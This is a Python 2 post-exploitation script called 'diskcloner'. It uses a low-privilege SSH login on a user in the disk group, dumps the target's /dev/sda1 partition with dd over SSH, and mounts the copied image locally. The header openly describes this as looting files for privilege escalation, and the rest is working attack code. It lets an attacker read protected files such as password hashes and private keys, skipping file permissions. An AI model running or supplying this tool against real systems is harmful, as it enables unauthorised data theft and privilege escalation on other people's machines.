#!/usr/bin/env python2
#  -*- coding: utf-8 -*- ###############################################################################################
#                                                                                                                      #
#                                                                                                                      #
#▓█████▄  ██▓  ██████  ██ ▄█▀ ▄████▄   ██▓     ▒█████   ███▄    █ ▓█████  ██▀███                                       #
#▒██▀ ██▌▓██▒▒██    ▒  ██▄█▒ ▒██▀ ▀█  ▓██▒    ▒██▒  ██▒ ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒                                     #
#░██   █▌▒██▒░ ▓██▄   ▓███▄░ ▒▓█    ▄ ▒██░    ▒██░  ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒                                     #
#░▓█▄   ▌░██░  ▒   ██▒▓██ █▄ ▒▓▓▄ ▄██▒▒██░    ▒██   ██░▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄                                       #
#░▒████▓ ░██░▒██████▒▒▒██▒ █▄▒ ▓███▀ ░░██████▒░ ████▓▒░▒██░   ▓██░░▒████▒░██▓ ▒██▒                                     #
#▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░ ░▒ ▒  ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░                                      #
#░ ▒  ▒  ▒ ░░ ░▒  ░ ░░ ░▒ ▒░  ░  ▒   ░ ░ ▒  ░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░                                      #
#░ ░  ░  ▒ ░░  ░  ░  ░ ░░ ░ ░          ░ ░   ░ ░ ░ ▒     ░   ░ ░    ░     ░░   ░                                       #
#░     ░        ░  ░  ░   ░ ░          ░  ░    ░ ░           ░    ░  ░   ░                                             #
#░                          ░                                                                                          #
# diskcloner nighter@nighter.se                                                                                        #
#                                                                                                                      #
# DATE                                                                                                                 #
# 14/06/2018                                                                                                           #
#                                                                                                                      #
# DESCRIPTION                                                                                                          #
# ssh's into a machine loot files that can be used for privesc from hardrive if you are part of the disk group         #
#                                                                                                                      #
# Mikael Kall - nighter@nighter.se                                                                                     #
#                                                                                                                      #
########################################################################################################################

import getpass
import commands
import string
import random
import signal
import sys
import os

# chdir to script working directory
os.chdir(os.path.realpath(os.path.dirname(sys.argv[0])))

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)


def loot_drive():

    if os.path.isfile('/usr/bin/sshpass') is False:
        print("Missing sshpass application, please install it.")
        sys.exit(0)

    if os.path.isfile('/usr/bin/pv') is False:
        print("Missing pv application, please install it.")
        sys.exit(0)

    # Generate random string.
    randomname = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
    homefolder = os.path.expanduser("~")
    diskclonerdir = '%s/.diskcloner' % homefolder
    tempdir = '%s/%s' % (diskclonerdir, randomname)
    mountdir = '%s/mount' % tempdir

    if os.path.exists(diskclonerdir) is False:
        os.makedirs(diskclonerdir)

    if os.path.exists(tempdir) is False:
        os.makedirs(tempdir)

    if os.path.exists(mountdir) is False:
        os.makedirs(mountdir)

    # Make sure we are in tempdir
    os.chdir(tempdir)

    # Validate connection
    output = commands.getoutput("timeout 3 sshpass -p %s ssh -p %s -T %s@%s 'ls -1 /etc/passwd'" % (PASSWORD, PORT, USER, IP))

    if '/etc/passwd' not in output:
        print("Error: Could not ssh to host")
        return False

    print("")
    os.system('sshpass -p %s ssh -p %s %s@%s "dd if=/dev/sda1" | pv > image.raw' % (PASSWORD, PORT, USER, IP))

    if os.path.exists(tempdir + '/image.raw') is False:
        print("Error: Failed to create image file")
        sys.exit(0)

    print('RUNNING: sudo mount -o loop %s/image.raw %s' % (tempdir, mountdir))
    os.system('sudo mount -o loop %s/image.raw %s' % (tempdir, mountdir))
    print("Mounted: %s" % mountdir)


def print_usage():
    print ("""
▓█████▄  ██▓  ██████  ██ ▄█▀ ▄████▄   ██▓     ▒█████   ███▄    █ ▓█████  ██▀███  
▒██▀ ██▌▓██▒▒██    ▒  ██▄█▒ ▒██▀ ▀█  ▓██▒    ▒██▒  ██▒ ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
░██   █▌▒██▒░ ▓██▄   ▓███▄░ ▒▓█    ▄ ▒██░    ▒██░  ██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
░▓█▄   ▌░██░  ▒   ██▒▓██ █▄ ▒▓▓▄ ▄██▒▒██░    ▒██   ██░▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
░▒████▓ ░██░▒██████▒▒▒██▒ █▄▒ ▓███▀ ░░██████▒░ ████▓▒░▒██░   ▓██░░▒████▒░██▓ ▒██▒
 ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░ ░▒ ▒  ░░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
 ░ ▒  ▒  ▒ ░░ ░▒  ░ ░░ ░▒ ▒░  ░  ▒   ░ ░ ▒  ░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░ ░  ░  ▒ ░░  ░  ░  ░ ░░ ░ ░          ░ ░   ░ ░ ░ ▒     ░   ░ ░    ░     ░░   ░ 
   ░     ░        ░  ░  ░   ░ ░          ░  ░    ░ ░           ░    ░  ░   ░     
 ░                          ░                                                    
[nighter@nighter.se]
    """)
    print "Usage: %s <USERNAME>@<HOST:[PORT]>" % (sys.argv[0])
    sys.exit(0)

if __name__ == '__main__':

    if len(sys.argv) != 2:
        print_usage()

    HOST = sys.argv[1]

    if '@' not in HOST:
        print_usage()
    else:
        USER = HOST.split('@')[0]
        IP = HOST.split('@')[1]

    if ':' in IP:
        PORT = IP.split(':')[1]
        IP = IP.split(':')[0]
    else:
        PORT = 22

    PASSWORD = getpass.getpass('Password:')

    loot_drive()